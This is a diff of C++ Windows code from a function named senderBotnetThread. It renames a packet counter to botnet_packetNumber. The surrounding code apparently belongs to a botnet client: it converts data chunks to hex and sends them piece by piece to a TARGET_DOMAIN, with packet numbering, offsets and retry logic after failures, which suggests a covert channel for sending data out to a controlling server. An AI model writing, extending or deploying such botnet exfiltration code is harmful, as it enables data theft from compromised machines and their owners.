@@ -23,7 +23,7 @@ DWORD senderBotnetThread(LPVOID lpParam)
 
         while (true)
         {
-            int retcode = sendDataTypeP(connectionId, packetNumber, chunk_offset, TARGET_DOMAIN.c_str());
+            int retcode = sendDataTypeP(connectionId, botnet_packetNumber, chunk_offset, TARGET_DOMAIN.c_str());
 
             if (retcode == 1) {
                 std::string chunk_data;
@@ -54,9 +54,9 @@ DWORD senderBotnetThread(LPVOID lpParam)
             }
         }
 
-        packetNumber++;
-        if (packetNumber > 999) {
-            packetNumber = 0;
+        botnet_packetNumber++;
+        if (botnet_packetNumber > 999) {
+            botnet_packetNumber = 0;
         }
 
         std::string dataToSend;
@@ -96,13 +96,13 @@ DWORD senderBotnetThread(LPVOID lpParam)
                 
                 std::string chunkHex = convertToHex(chunk.c_str());
                 
-                int success = sendDataTypeC(connectionId, packetNumber, offset_number,
+                int success = sendDataTypeC(connectionId, botnet_packetNumber, offset_number,
                                             TARGET_DOMAIN.c_str(), chunkHex.c_str());
 
                 if (success == 0) {
-                    packetNumber++;
-                    if (packetNumber > 999) {
-                        packetNumber = 0;
+                    botnet_packetNumber++;
+                    if (botnet_packetNumber > 999) {
+                        botnet_packetNumber = 0;
                     }
 
                     offset += chunkLen;
@@ -112,9 +112,9 @@ DWORD senderBotnetThread(LPVOID lpParam)
                     consecutiveFailures++;
                     
                     if (consecutiveFailures >= MAX_FAILURES) {
-                        packetNumber++;
-                        if (packetNumber > 999) {
-                            packetNumber = 0;
+                        botnet_packetNumber++;
+                        if (botnet_packetNumber > 999) {
+                            botnet_packetNumber = 0;
                         }
                         offset += chunkLen;
                         consecutiveFailures = 0;
